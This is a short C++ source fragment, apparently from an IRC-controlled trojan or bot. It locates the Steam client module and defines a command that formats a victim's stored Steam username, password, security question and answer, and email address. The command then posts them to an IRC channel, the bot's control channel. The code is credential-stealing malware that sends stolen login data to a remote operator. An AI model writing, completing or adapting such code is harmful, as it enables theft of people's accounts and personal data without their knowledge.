#include "includes.h"
#include "extern.h"
#include "steaminfo.h"

/************************************************************************************/
/* All steam interface stuff														*/
/************************************************************************************/
//redefined, thanks valve!
typedef void *( *CreateInterfaceFn )( const char *pName, int *pReturnCode );

//used for logging information
cSteamInfo					g_SteamInfo;

bool GrabSteamClientModule( HMODULE* hModule )
{
	*hModule = GetModuleHandleA("steamclient.dll");
	return ( *hModule == NULL ) ? false : true;
}



void Cmd_slogininfo()
{
	sprintf(tstr, "-SteamAPI- Steam Login Information [ User: %s - Pass: %s ]"
		"[ Question: %s - Answer: %s ]"
		"[ Email: %s ]",
		(g_SteamInfo.Username.empty()) ? "NONE" : g_SteamInfo.Username.c_str(), 
		(g_SteamInfo.Password.empty()) ? "NONE" : g_SteamInfo.Password.c_str(),
		(g_SteamInfo.NewQuestion.empty()) ? "NONE" : g_SteamInfo.NewQuestion.c_str(), 
		(g_SteamInfo.QuestionAnswer.empty()) ? "NONE" : g_SteamInfo.QuestionAnswer.c_str(),
		(g_SteamInfo.Email.empty()) ? "NONE" : g_SteamInfo.Email.c_str() );
	if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);
	
}

